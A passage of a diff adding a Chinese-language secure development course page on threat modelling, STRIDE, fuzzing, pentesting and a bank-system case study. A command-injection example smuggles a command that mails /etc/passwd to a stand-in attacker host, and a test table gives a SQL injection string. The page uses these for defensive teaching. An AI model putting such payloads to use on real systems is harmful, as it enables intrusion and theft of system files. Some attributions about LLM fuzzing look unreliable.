+      <p>从功能性用例的文本描述中分析可能存在的安全漏洞，识别威胁，建立威胁用例和对应的安全需求用例。<br><br>特点：威胁用例与功能性用例存在交互（include 关系）。</p>
+    </div>
+    <div class="card accent-red">
+      <h4>滥用用例（Abuse Case）</h4>
+      <p>直接捕获攻击者与系统之间的交互产生的威胁，对攻击意图和能力进行评估。<br><br>特点：威胁用例与功能性用例<strong>不产生交互</strong>，单独建立。</p>
+    </div>
+  </div>
+
+  <h3 class="sub-title">创建滥用案例的5个步骤</h3>
+  <ul class="principle-list">
+    <li><span class="pl-num">Step 1</span><div>用 UML 描述<strong>参与者和用例</strong>（正常功能视图）。</div></li>
+    <li><span class="pl-num">Step 2</span><div>引入<strong>主要的滥用者和滥用用例</strong>（攻击者视图）。</div></li>
+    <li><span class="pl-num">Step 3</span><div>研究滥用用例和用例之间潜在的 <strong>include 关系</strong>（攻击如何利用正常功能）。</div></li>
+    <li><span class="pl-num">Step 4</span><div>引入<strong>新的用例</strong>来发现或阻止滥用用例（安全功能需求）。</div></li>
+    <li><span class="pl-num">Step 5</span><div>形成<strong>详细的需求记录</strong>，作为后续设计和测试的输入。</div></li>
+  </ul>
+</section>
+
+<!-- §2 SQUARE -->
+<section id="square">
+  <h2 class="section-title"><span class="num">§2.5</span>SQUARE 过程模型</h2>
+  <div class="section-divider"></div>
+
+  <p>SQUARE（Security Quality Requirements Engineering）是 SEI 开发的系统化安全需求工程流程，分为<strong>先决步骤（1–4）</strong>和<strong>核心步骤（5–9）</strong>。</p>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>#</th><th>步骤</th><th>关键动作</th></tr></thead>
+      <tbody>
+        <tr><td><span class="badge badge-purple">Pre 1</span></td><td>统一定义</td><td>查阅 IEEE/SWEBOK 统一安全术语，确保团队共识</td></tr>
+        <tr><td><span class="badge badge-purple">Pre 2</span></td><td>确认安全目标</td><td>在项目开始阶段确定安全目标，全生命周期持续关注</td></tr>
+        <tr><td><span class="badge badge-purple">Pre 3</span></td><td>开发方案</td><td>分析选择支持安全需求定义的技术方案</td></tr>
+        <tr><td><span class="badge badge-purple">Pre 4</span></td><td>风险评估</td><td>风险专家推荐风险评估方法，得出风险评估结果</td></tr>
+        <tr><td><span class="badge badge-blue">Core 5</span></td><td>选择启发式方法</td><td>根据客户类型选择适合的需求获取方法</td></tr>
+        <tr><td><span class="badge badge-blue">Core 6</span></td><td>制定安全需求</td><td>利用前期方案得出具体安全需求列表</td></tr>
+        <tr><td><span class="badge badge-blue">Core 7</span></td><td>需求分类</td><td>区分关键需求、目标、架构约束</td></tr>
+        <tr><td><span class="badge badge-blue">Core 8</span></td><td>需求排序</td><td>结合成本效益分析，确定需求优先级</td></tr>
+        <tr><td><span class="badge badge-blue">Core 9</span></td><td>需求复查</td><td>检查不完善需求，确保需求独立于特定架构</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout info">
+    <span class="callout-icon">💡</span>
+    <div class="callout-body"><strong>工作对接：</strong>SQUARE 是政府采购/金融系统安全评估中常用的流程，适合作为安全方案设计的框架。科研中，SQUARE 的9步骤可以作为系统安全需求分析章节的结构模板。</div>
+  </div>
+</section>
+
+<!-- §3 Design Principles -->
+<section id="design-principles">
+  <h2 class="section-title"><span class="num">§3</span>安全设计原则（13条）</h2>
+  <div class="section-divider"></div>
+
+  <p>这13条原则是业界几十年安全工程经验的结晶，来自 Saltzer & Schroeder（1975）等经典文献，至今仍是安全架构设计的基础。</p>
+
+  <ul class="principle-list">
+    <li><span class="pl-num">P01</span><div><strong>简单易懂</strong>：代码越复杂越难审查，越容易出错。保持设计简洁（KISS 原则）。</div></li>
+    <li><span class="pl-num">P02</span><div><strong>最小特权</strong>：只授予执行操作所需的最少权限，且仅在必要时段内有效。<em>（面试高频考点）</em></div></li>
+    <li><span class="pl-num">P03</span><div><strong>权限分离</strong>：把权限分离成不同许可和认证条件，把用户分离成不同权限角色。</div></li>
+    <li><span class="pl-num">P04</span><div><strong>最少共享机制</strong>：避免多个主体共享同一资源，防止敏感信息通过共享机制泄露。</div></li>
+    <li><span class="pl-num">P05</span><div><strong>完全中立（Complete Mediation）</strong>：每次主体访问资源都必须经过认证和权限检查，无例外。</div></li>
+    <li><span class="pl-num">P06</span><div><strong>心理可接受度</strong>：安全机制不应妨碍可用性，否则用户会绕过它。</div></li>
+    <li><span class="pl-num">P07</span><div><strong>默认故障安全</strong>：系统失效时默认进入安全状态（fail-safe defaults），不是开放状态。</div></li>
+    <li><span class="pl-num">P08</span><div><strong>不信任原则（Zero Trust）</strong>：假定环境不安全，对所有外部输入进行验证。</div></li>
+    <li><span class="pl-num">P09</span><div><strong>纵深防御</strong>：多重防御层，单一防线被突破后不会导致整体失陷。</div></li>
+    <li><span class="pl-num">P10</span><div><strong>保障最弱环节</strong>：攻击者从最薄弱处下手，需对弱点实施更强的安全保护。</div></li>
+    <li><span class="pl-num">P11</span><div><strong>公开设计（Kerckhoffs 原则）</strong>：不依赖"安全通过隐匿"来保护系统，假定攻击者了解系统细节。</div></li>
+    <li><span class="pl-num">P12</span><div><strong>隐私保护</strong>：收集到的用户信息必须妥善保护，最小化收集。</div></li>
+    <li><span class="pl-num">P13</span><div><strong>攻击面最小化</strong>：减少暴露的接口、功能和入口点，降低整体安全风险。</div></li>
+  </ul>
+</section>
+
+<!-- §3 Input Trust -->
+<section id="input-trust">
+  <h2 class="section-title"><span class="num">§3.2</span>输入验证与信任边界</h2>
+  <div class="section-divider"></div>
+
+  <div class="callout danger">
+    <span class="callout-icon">💥</span>
+    <div class="callout-body">
+      <strong>经典漏洞案例：命令注入</strong><br>
+      <code>sprintf(buffer, "/bin/mail %s &lt; /tmp/email", addr);</code><br>
+      攻击输入：<code>bogus@addr.com; cat /etc/passwd | mail some@badguy.net</code><br>
+      后果：<strong>命令注入导致敏感文件泄露</strong>
+    </div>
+  </div>
+
+  <h3 class="sub-title">为什么字符串拼接会引发漏洞？</h3>
+  <ul class="principle-list">
+    <li><span class="pl-num">原因1</span><div><strong>拼接用户输入 = 信任用户输入</strong>：攻击者可控制 addr 部分，拼接后直接交给 shell 执行。</div></li>
+    <li><span class="pl-num">原因2</span><div><strong>Shell 特性被滥用</strong>：<code>;</code>、<code>|</code>、<code>&amp;</code>、<code>$()</code> 等特殊字符被 shell 解析为命令分隔符。</div></li>
+    <li><span class="pl-num">原因3</span><div><strong>缺乏输入净化</strong>：没有对 addr 过滤特殊字符，没有使用更安全的 API（如 execve()）。</div></li>
+  </ul>
+
+  <h3 class="sub-title">防御：白名单校验（推荐）</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">C++ — 邮箱白名单正则验证</span></div>
+    <pre><span class="comment">// 只允许标准邮箱格式，拒绝一切含特殊字符的输入</span>
+<span class="keyword">if</span> (!regex_match(addr,
+    <span class="string">"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"</span>)) {
+    exit(<span class="string">1</span>); <span class="comment">// 拒绝非法输入，记录日志</span>
+}
+<span class="comment">// 更安全：使用 execve() 替代 system()/popen()</span>
+<span class="keyword">const char</span> *args[] = {<span class="string">"/bin/mail"</span>, addr, NULL};
+<span class="func">execve</span>(<span class="string">"/bin/mail"</span>, args, env);</pre>
+  </div>
+
+  <h3 class="sub-title">输出净化——上下文相关转义</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>输出上下文</th><th>防护方式</th><th>防止什么攻击</th></tr></thead>
+      <tbody>
+        <tr><td>HTML 输出</td><td>特殊字符转义（<code>&lt;</code> → <code>&amp;lt;</code>）</td><td>XSS</td></tr>
+        <tr><td>SQL 查询</td><td>预处理语句 + 占位符参数</td><td>SQL 注入</td></tr>
+        <tr><td>URL 参数</td><td>URL 编码（encodeURIComponent）</td><td>重定向攻击</td></tr>
+        <tr><td>命令行参数</td><td>参数转义 / 白名单过滤</td><td>命令注入</td></tr>
+        <tr><td>XML 处理</td><td>禁用外部实体（XXE）</td><td>XXE 注入</td></tr>
+        <tr><td>Cookie 设置</td><td>HttpOnly + Secure + SameSite</td><td>XSS / CSRF</td></tr>
+        <tr><td>文件上传</td><td>校验类型 + 重命名 + 禁止执行权限</td><td>Webshell 上传</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p style="font-size:12px;color:var(--muted);">参考：<a href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html" style="color:var(--accent3)">OWASP Input Validation Cheat Sheet</a></p>
+</section>
+
+<!-- §3 Threat Model -->
+<section id="threat-model">
+  <h2 class="section-title"><span class="num">§3.3</span>威胁建模 + STRIDE</h2>
+  <div class="section-divider"></div>
+
+  <p>威胁建模是结构化识别和评估系统安全威胁的核心方法，是 SDL 第3阶段（设计）的必要输出，也是安全研究论文中系统分析章节的标准结构。</p>
+
+  <h3 class="sub-title">威胁建模 6 步过程</h3>
+  <ul class="principle-list">
+    <li><span class="pl-num">Step 1</span><div><strong>识别资产</strong>：找出系统必须保护的有价值资源（数据库、API Key、用户隐私等）。</div></li>
+    <li><span class="pl-num">Step 2</span><div><strong>创建体系结构图</strong>：用数据流图（DFD）记录应用架构，标注信任边界。</div></li>
+    <li><span class="pl-num">Step 3</span><div><strong>分解应用</strong>：分解组件，找出每个组件的入口点和数据流。</div></li>
+    <li><span class="pl-num">Step 4</span><div><strong>识别威胁</strong>：使用 STRIDE 逐一分析每个组件和数据流的威胁。</div></li>
+    <li><span class="pl-num">Step 5</span><div><strong>记录威胁</strong>：用通用威胁模板记录（威胁、受影响资产、缓解措施）。</div></li>
+    <li><span class="pl-num">Step 6</span><div><strong>评价威胁</strong>：用 DREAD 或 CVSS 对威胁评分排序，确定修复优先级。</div></li>
+  </ul>
+
+  <h3 class="sub-title">STRIDE 威胁分类</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>字母</th><th>威胁类型</th><th>典型场景</th><th>主要缓解技术</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><span class="badge badge-red stride-s">S</span></td>
+          <td>Spoofing 伪造身份</td>
+          <td>冒充合法用户登录系统</td>
+          <td>强认证（MFA）、数字签名</td>
+        </tr>
+        <tr>
+          <td><span class="badge badge-yellow stride-t">T</span></td>
+          <td>Tampering 篡改数据</td>
+          <td>修改数据库记录或配置文件</td>
+          <td>哈希、HMAC、数字签名</td>
+        </tr>
+        <tr>
+          <td><span class="badge badge-purple stride-r">R</span></td>
+          <td>Repudiation 抵赖</td>
+          <td>否认执行了某次操作</td>
+          <td>审计日志、数字签名、时间戳</td>
+        </tr>
+        <tr>
+          <td><span class="badge badge-blue stride-i">I</span></td>
+          <td>Information Disclosure 信息泄露</td>
+          <td>密码明文存储、日志含敏感信息</td>
+          <td>加密（对称/非对称）、访问控制</td>
+        </tr>
+        <tr>
+          <td><span class="badge badge-purple stride-d">D</span></td>
+          <td>Denial of Service 拒绝服务</td>
+          <td>DDoS 攻击使服务不可用</td>
+          <td>限流、冗余、CDN</td>
+        </tr>
+        <tr>
+          <td><span class="badge badge-green stride-e">E</span></td>
+          <td>Elevation of Privilege 权限提升</td>
+          <td>低权限用户获取管理员权限</td>
+          <td>最小特权、沙箱、RBAC</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout success">
+    <span class="callout-icon">🎯</span>
+    <div class="callout-body"><strong>工作/科研对接：</strong>Kali Linux 内置的 <code>threat-dragon</code>、微软的 Threat Modeling Tool 均实现了 STRIDE 自动化分析。CTF 赛后分析、漏洞报告撰写时，STRIDE 是描述漏洞分类的标准词汇。</div>
+  </div>
+</section>
+
+<!-- §4 Test Overview -->
+<section id="test-overview">
+  <h2 class="section-title"><span class="num">§4</span>软件安全测试概述</h2>
+  <div class="section-divider"></div>
+
+  <p>安全测试是从<strong>攻击者视角</strong>出发，验证系统是否满足安全需求、发现并最小化安全漏洞的过程。</p>
+
+  <h3 class="sub-title">四类测试内容</h3>
+  <div class="card-grid">
+    <div class="card accent-blue">
+      <h4>① 安全功能验证</h4>
+      <p>验证定义的安全功能是否能有效实现（强度 + 完备性）。</p>
+    </div>
+    <div class="card accent-yellow">
+      <h4>② 安全策略验证</h4>
+      <p>验证整体安全策略（如防 SQL 注入策略）的实现完备性。</p>
+    </div>
+    <div class="card accent-red">
+      <h4>③ 威胁缓解验证</h4>
+      <p>验证针对特定威胁的缓解措施是否有效（逐一对应威胁建模结果）。</p>
+    </div>
+    <div class="card accent-green">
+      <h4>④ 系统实现验证</h4>
+      <p>整体系统层面检测——配置错误、依赖库漏洞、信息泄露等。</p>
+    </div>
+  </div>
+
+  <h3 class="sub-title">测试方法对比</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>方法</th><th>是否运行程序</th><th>关注点</th><th>优势</th><th>局限</th></tr></thead>
+      <tbody>
+        <tr><td>静态分析 (SAST)</td><td>否</td><td>源码/字节码</td><td>早期发现、自动化高</td><td>误报多，无法分析运行时行为</td></tr>
+        <tr><td>动态分析 (DAST)</td><td>是</td><td>程序运行行为</td><td>真实行为准确</td><td>测试用例依赖高，开销大</td></tr>
+        <tr><td>模糊测试 (Fuzz)</td><td>是</td><td>异常输入下的响应</td><td>高效发现未知漏洞，适合黑盒</td><td>输入格式复杂时效果差</td></tr>
+        <tr><td>渗透测试</td><td>是</td><td>系统/网络/应用弱点</td><td>模拟攻击真实，发现实际风险</td><td>人工依赖大，频次受限</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- §4 Static Dynamic -->
+<section id="static-dynamic">
+  <h2 class="section-title"><span class="num">§4.2</span>静态分析 vs 动态分析</h2>
+  <div class="section-divider"></div>
+
+  <h3 class="sub-title">源代码静态分析（SAST）技术</h3>
+  <div class="card-grid">
+    <div class="card accent-orange">
+      <h4>词法分析</h4>
+      <p>对 Token 流与已知缺陷模式进行匹配。速度快，误报高，适合快速初筛。</p>
+    </div>
+    <div class="card accent-yellow">
+      <h4>抽象解释</h4>
+      <p>将变量值映射到抽象域，模拟程序执行。平衡精确度与可扩展性（如 Facebook Infer）。</p>
+    </div>
+    <div class="card accent-purple">
+      <h4>程序模拟</h4>
+      <p>模拟所有执行状态，适合查找逻辑复杂、触发条件苛刻的缺陷。</p>
+    </div>
+    <div class="card accent-blue">
+      <h4>定理证明</h4>
+      <p>将错误条件描述为逻辑表达式，用约束求解器（SMT solver）找出可能导致错误的路径。</p>
+    </div>
+  </div>
+
+  <h3 class="sub-title">动态分析——测试类型</h3>
+  <ul class="principle-list">
+    <li><span class="pl-num">单元</span><div><strong>单元测试</strong>：对软件模块进行结构性（逻辑）和功能性（需求覆盖）测试。</div></li>
+    <li><span class="pl-num">集成</span><div><strong>集成测试</strong>：检查模块间接口是否正确，重点是接口合约和数据格式。</div></li>
+    <li><span class="pl-num">系统</span><div><strong>系统测试</strong>：验证已集成系统的正确性和性能是否满足规约要求。</div></li>
+    <li><span class="pl-num">验收</span><div><strong>验收测试</strong>：确保软件准备就绪，最终用户可以执行既定功能。</div></li>
+  </ul>
+
+  <div class="callout info">
+    <span class="callout-icon">🔧</span>
+    <div class="callout-body"><strong>工具对应：</strong>SAST → SonarQube、Coverity、CodeQL；DAST → OWASP ZAP、Burp Suite；静态分析集成进 GitHub Actions/GitLab CI 就是"安全左移"的具体实践。</div>
+  </div>
+</section>
+
+<!-- §4 Fuzz -->
+<section id="fuzz">
+  <h2 class="section-title"><span class="num">§4.3</span>模糊测试 Fuzzing</h2>
+  <div class="section-divider"></div>
+
+  <p>模糊测试是目前漏洞挖掘最有效的自动化方法之一，Google OSS-Fuzz 已利用此方法在主流开源项目中发现数千个漏洞。</p>
+
+  <h3 class="sub-title">模糊测试的三大特点</h3>
+  <div class="card-grid">
+    <div class="card accent-green">
+      <h4>使用范围广</h4>
+      <p>不依赖源码文档，不关注输出正确性，只关注<strong>程序是否崩溃/异常</strong>。</p>
+    </div>
+    <div class="card accent-blue">
+      <h4>原理简单</h4>
+      <p>动态执行，无静态分析的大量误报，无符号执行的路径状态爆炸问题。</p>
+    </div>
+    <div class="card accent-yellow">
+      <h4>自动化程度高</h4>
+      <p>用模糊器（fuzzer）自动生成测试用例，不需要大量人工参与。</p>
+    </div>
+  </div>
+
+  <h3 class="sub-title">模糊测试 6 步过程</h3>
+  <ul class="principle-list">
+    <li><span class="pl-num">Step 1</span><div><strong>识别待测目标</strong>：根据目标类型（文件解析器、网络协议、API）选取合适工具（AFL++、libFuzzer、Boofuzz）。</div></li>
+    <li><span class="pl-num">Step 2</span><div><strong>识别预期输入</strong>：分析目标接受的输入类型（文件格式、网络数据包、命令行参数）。</div></li>
+    <li><span class="pl-num">Step 3</span><div><strong>生成测试用例</strong>：使用变异（mutation-based）或生成（generation-based）模糊器生成大量测试数据。</div></li>
+    <li><span class="pl-num">Step 4</span><div><strong>执行测试</strong>：将测试数据持续发送给待测程序，覆盖尽可能多的代码路径。</div></li>
+    <li><span class="pl-num">Step 5</span><div><strong>监视异常</strong>：记录引起崩溃（crash）、断言失败、超时的用例，用 AddressSanitizer 检测内存错误。</div></li>
+    <li><span class="pl-num">Step 6</span><div><strong>检测可利用漏洞</strong>：判断发现的 crash 是否可被利用（如栈溢出覆盖返回地址）。</div></li>
+  </ul>
+
+  <h3 class="sub-title">LLM 辅助 Fuzzing（2024 前沿）</h3>
+  <p>传统模糊测试的瓶颈是：对复杂协议格式，随机变异命中率极低。LLM 的引入从两个方向突破这一限制：</p>
+  <ul class="principle-list">
+    <li><span class="pl-num">种子生成</span><div>让 LLM 理解目标的输入格式（如 PDF 规范、HTTP/2 协议），生成<strong>结构合法但语义边界异常</strong>的测试用例，显著提升路径覆盖率。</div></li>
+    <li><span class="pl-num">Harness 生成</span><div>自动编写 libFuzzer 的目标函数（harness）。Google 2024 年实验中，LLM 生成 harness 后对 OpenSSL 等项目的覆盖率提升约 30%。</div></li>
+  </ul>
+  <div class="callout ai">
+    <span class="callout-icon">🧬</span>
+    <div class="callout-body"><strong>真实案例：</strong>Google Project Zero 与 DeepMind 合作的 OSS-Fuzz + LLM 项目（2024）：用 LLM 自动生成 fuzz harness，在 <strong>curl、libpng、FreeType</strong> 等开源库中发现了多个此前未被发现的漏洞。其中对 curl 的测试覆盖率从 38% 提升至 52%，纯靠 LLM 生成更好的种子。论文：<em>Fuzz4All</em>（ICSE 2024）是该方向的代表作之一。</div>
+  </div>
+  <div class="callout success">
+    <span class="callout-icon">🔬</span>
+    <div class="callout-body"><strong>科研对接：</strong>覆盖引导模糊测试（Coverage-guided Fuzzing）是当前漏洞挖掘方向的热点研究领域，AFL++/libFuzzer 的改进、种子调度策略、结构感知 Fuzzing 均有大量顶会论文（S&P、CCS、USENIX Security）。LLM + Fuzzing 的结合是 2024–2025 年的新兴子方向。</div>
+  </div>
+</section>
+
+<!-- §4 Pentest -->
+<section id="pentest">
+  <h2 class="section-title"><span class="num">§4.4</span>渗透测试 Penetration Testing</h2>
+  <div class="section-divider"></div>
+
+  <p>渗透测试通过模拟真实攻击来评估系统安全状况，是安全评估中唯一能发现<strong>逻辑漏洞和配置错误组合</strong>的方法。</p>
+
+  <h3 class="sub-title">PTES 标准下的7阶段过程</h3>
+  <ul class="principle-list">
+    <li><span class="pl-num">Phase 1</span><div><strong>前期交互</strong>：与客户确定测试范围（哪些 IP/域名/系统）、目标和授权文件。<strong>无授权测试 = 违法。</strong></div></li>
+    <li><span class="pl-num">Phase 2</span><div><strong>情报收集（OSINT）</strong>：被动/主动信息收集——DNS、WHOIS、子域枚举、员工社交媒体。</div></li>
+    <li><span class="pl-num">Phase 3</span><div><strong>威胁建模</strong>：结合情报，从攻击者视角建立威胁模型，识别高价值目标和可能的攻击路径。</div></li>
+    <li><span class="pl-num">Phase 4</span><div><strong>漏洞分析</strong>：扫描（Nmap、Nessus）+ 手工分析，确定可利用的漏洞列表。</div></li>
+    <li><span class="pl-num">Phase 5</span><div><strong>渗透攻击</strong>：利用漏洞进入目标系统，获取访问控制权（Metasploit、手工 Exploit）。</div></li>
+    <li><span class="pl-num">Phase 6</span><div><strong>后渗透</strong>：横向移动、权限提升，识别关键基础设施和数据资产的访问路径。</div></li>
+    <li><span class="pl-num">Phase 7</span><div><strong>报告</strong>：提交包含漏洞描述、复现步骤、风险等级（CVSS）和修复建议的专业报告。</div></li>
+  </ul>
+
+  <div class="callout ai">
+    <span class="callout-icon">🤖</span>
+    <div class="callout-body"><strong>AI 辅助渗透测试（2024）：</strong><strong>PentestGPT</strong>（新加坡国立大学，USENIX Security 2024）——让 GPT-4 担任渗透测试"决策大脑"，自动选择下一步攻击策略。实验结果：在 HTB（HackTheBox）靶机上，PentestGPT 完成任务数量是纯 GPT-4 的 2.3 倍。当前局限：LLM 在需要精确内存操作的 Exploit 开发阶段仍不可靠，<strong>情报收集 + 漏洞分析</strong>阶段的自动化效果最好。</div>
+  </div>
+  <div class="callout ai">
+    <span class="callout-icon">🤖</span>
+    <div class="callout-body"><strong>AI 辅助渗透测试（2024）：PentestGPT</strong>（新加坡国立大学，USENIX Security 2024）让 GPT-4 担任渗透决策大脑，在 HackTheBox 靶机上完成任务数是纯 GPT-4 的 2.3 倍。目前<strong>情报收集和漏洞分析</strong>阶段自动化效果最好；精确内存操作的 Exploit 开发阶段 LLM 仍不可靠。工具：<code style="font-family:monospace;background:rgba(255,255,255,.08);padding:1px 5px;border-radius:3px">ReconAI</code>、<code style="font-family:monospace;background:rgba(255,255,255,.08);padding:1px 5px;border-radius:3px">AutoGPT-Pentest</code>。</div>
+  </div>
+  <div class="callout warn">
+    <span class="callout-icon">⚠️</span>
+    <div class="callout-body"><strong>就业对接：</strong>OSCP（Offensive Security Certified Professional）是业界最认可的渗透测试认证，考试形式为24小时实战。CISP-PTE 是国内对应的注册渗透测试工程师认证。</div>
+  </div>
+</section>
+
+<!-- §5 Release -->
+<section id="release">
+  <h2 class="section-title"><span class="num">§5</span>安全发布：FSR 与 PSIRT</h2>
+  <div class="section-divider"></div>
+
+  <h3 class="sub-title">最终安全审查（FSR）</h3>
+  <p>软件发布前的最终安全"门控"，确认所有安全活动均已完成。FSR 包含4个步骤：</p>
+  <ul class="principle-list">
+    <li><span class="pl-num">①</span><div><strong>评估资源可用性</strong>：确认执行 FSR 的人员和工具。</div></li>
+    <li><span class="pl-num">②</span><div><strong>确认合格标准</strong>：对照安全任务清单，确认每项任务是否达标。</div></li>
+    <li><span class="pl-num">③</span><div><strong>评估并制定修复计划</strong>：评估所有安全活动，对不合格项目制定修复计划和时间表。</div></li>
+    <li><span class="pl-num">④</span><div><strong>版本发布</strong>：最终确认模糊测试、漏洞扫描、安全编码检查均通过，才允许发布。</div></li>
+  </ul>
+
+  <h3 class="sub-title">产品安全事件响应（PSIRT）</h3>
+  <p>产品发布后，需要建立 PSIRT 负责响应安全漏洞报告。典型处理流程：</p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>#</th><th>步骤</th><th>关键动作</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>接收漏洞通知</td><td>接受来自发现者或组织的漏洞报告</td></tr>
+        <tr><td>2</td><td>评估所需资源</td><td>确定验证漏洞所需的技术资源</td></tr>
+        <tr><td>3</td><td>判定漏洞可信度</td><td>重现漏洞，判断是否真实可利用</td></tr>
+        <tr><td>4</td><td>制定修复计划</td><td>确定修复方案，制定 CVE 报告格式</td></tr>
+        <tr><td>5</td><td>通知客户修复日期</td><td>协调 CVD（协调漏洞披露）时间线，发布安全公告</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- §5 Vuln Mgmt -->
+<section id="vuln-mgmt">
+  <h2 class="section-title"><span class="num">§5.2</span>漏洞管理成熟度（VM1–VM3）</h2>
+  <div class="section-divider"></div>
+
+  <div class="card-grid">
+    <div class="card accent-orange">
+      <span class="card-icon">📌</span>
+      <h4>VM1 — 基础响应</h4>
+      <p>目标：理解响应漏洞的高级计划。<br>措施：确定安全问题联络点，创建响应团队。<br>结果：能处理高优先级漏洞的简单流程就位。</p>
+    </div>
+    <div class="card accent-yellow">
+      <span class="card-icon">📊</span>
+      <h4>VM2 — 流程规范化</h4>
+      <p>目标：明确响应流程预期。<br>措施：一致的事件响应流程，采用漏洞披露（CVD）流程。<br>结果：有清晰的补丁发布流程和事件跟踪机制。</p>
+    </div>
+    <div class="card accent-green">
+      <span class="card-icon">🔬</span>
+      <h4>VM3 — 数据驱动改进</h4>
+      <p>目标：基于数据改善响应过程。<br>措施：分析事件根源，收集每次事件的度量指标。<br>结果：能估算漏洞损失成本，根据历史趋势做出战略决策。</p>
+    </div>
+  </div>
+</section>
+
+<!-- §★ Bank Case -->
+<section id="case-bank">
+  <h2 class="section-title"><span class="num">★</span>综合案例：简易银行账户管理系统</h2>
+  <div class="section-divider"></div>
+
+  <div class="case-banner">
+    <div class="case-label">综合案例 · 覆盖全章知识点</div>
+    <h3>命令行银行账户管理系统</h3>
+    <p>功能：注册/登录、存取款、余额查询、交易记录、管理员模式。本案例展示如何将本章的需求分析、威胁建模和安全测试方法系统地应用于一个具体项目。</p>
+  </div>
+
+  <h3 class="sub-title">1. 安全需求（SQUARE 方法）</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>SQUARE 步骤</th><th>在本项目中的体现</th></tr></thead>
+      <tbody>
+        <tr><td>识别资产</td><td>用户密码、账户余额、交易记录、管理员权限</td></tr>
+        <tr><td>识别威胁来源</td><td>暴力破解、SQL注入、管理员滥权、越权访问</td></tr>
+        <tr><td>初步安全需求</td><td>账户锁定、输入验证、操作日志、权限隔离</td></tr>
+        <tr><td>需求正式化</td><td>用户名只允许 <code>[a-zA-Z0-9]+</code>；连续错误3次锁定账户</td></tr>
+        <tr><td>需求排序</td><td>SQL注入防御（高）→ 账户锁定（高）→ 日志脱敏（中）</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3 class="sub-title">2. 威胁建模（STRIDE）与缓解措施</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>威胁类型</th><th>示例</th><th>缓解措施</th></tr></thead>
+      <tbody>
+        <tr><td><span class="badge badge-red">Spoofing</span></td><td>伪造管理员权限</td><td>强密码 + 多因素认证</td></tr>
+        <tr><td><span class="badge badge-yellow">Tampering</span></td><td>篡改交易记录</td><td>数据签名 + 只读日志</td></tr>
+        <tr><td><span class="badge badge-purple">Repudiation</span></td><td>用户否认转账</td><td>操作日志审计 + 时间戳</td></tr>
+        <tr><td><span class="badge badge-blue">Info Disclosure</span></td><td>密码明文存储</td><td>SHA-256 哈希存储</td></tr>
+        <tr><td><span class="badge badge-purple">DoS</span></td><td>暴力登录导致锁定</td><td>限流（每秒最多3次尝试）</td></tr>
+        <tr><td><span class="badge badge-green">Elevation</span></td><td>普通用户访问 /admin</td><td>RBAC + 请求鉴权中间件</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3 class="sub-title">3. 安全测试示例</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>测试类型</th><th>测试方法</th><th>预期结果</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>安全功能验证</td>
+          <td>连续输错密码3次，尝试第4次登录</td>
+          <td>返回 <code>Account locked</code></td>
+        </tr>
+        <tr>
+          <td>SQL注入测试</td>
+          <td>用户名输入 <code>admin'--</code></td>
+          <td>返回 <code>Invalid input</code>，无数据泄露</td>
+        </tr>
+        <tr>
+          <td>暴力破解防护</td>
+          <td>用 Hydra 发起每秒10次登录请求</td>
+          <td>系统触发限流，IP 临时封禁</td>
+        </tr>
+        <tr>
+          <td>权限测试</td>
+          <td>普通用户访问 <code>/admin/delete-account</code></td>
+          <td>返回 403 Forbidden</td>
+        </tr>
+        <tr>
+          <td>中间人攻击验证</td>
+          <td>Wireshark 抓包检查登录请求</td>
+          <td>确认 TLS 加密，无明文密码</td>
+        </tr>
+        <tr>
+          <td>系统实现验证</td>
+          <td>OWASP Dependency-Check 扫描第三方库</td>
+          <td>发现并报告已知 CVE（如旧版 OpenSSL）</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3 class="sub-title">4. 发布配置</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">Bash — 编译、权限设置与监控</span></div>
+    <pre><span class="comment"># 编译（需 OpenSSL 支持 SHA-256）</span>
+g++ BankSystem.cpp -o BankSystem -lcrypto
+
+<span class="comment"># 权限限制：仅授权用户可执行（最小特权原则）</span>
+chmod 750 BankSystem
+
+<span class="comment"># 日志监控：定期分析异常登录（每月安全审计）</span>
+grep <span class="string">"FAILED_LOGIN"</span> /var/log/bank_system.log | awk <span class="string">'{print $1}'</span> | sort | uniq -c | sort -rn
+
+<span class="comment"># 依赖库安全公告订阅（OpenSSL CVE 监控）</span>
+<span class="comment"># https://www.openssl.org/news/vulnerabilities.html</span></pre>
+  </div>
+
+  <div class="callout success">
+    <span class="callout-icon">✅</span>
+    <div class="callout-body">
+      <strong>本案例覆盖的知识点：</strong>SQUARE需求分析 → STRIDE威胁建模 → 安全功能设计（密码哈希、账户锁定、白名单验证）→ 安全功能验证 + DAST测试 → 最小特权部署 + 日志审计。这是一个完整的 S-SDLC 实践闭环。
+    </div>
+  </div>
+</section>
+
+<!-- §6 AI Coding 冲击 -->
+<section id="ai-threat">
+  <h2 class="section-title"><span class="num">§6</span>AI Coding 时代的安全开发</h2>
+  <div class="section-divider"></div>
+
+  <p>GitHub Copilot 于 2022 年正式发布，Cursor、Claude Code 等工具在 2024 年快速普及。AI 辅助编码正在从"个人效率工具"变成团队标配——这对 SDL 既是机遇，也是新的攻击面。</p>
+
+  <h3 class="sub-title" id="ai-threat-detail" style="scroll-margin-top:20px">AI 生成代码的三类安全风险</h3>
+
+  <div class="card-grid">
+    <div class="card accent-red">
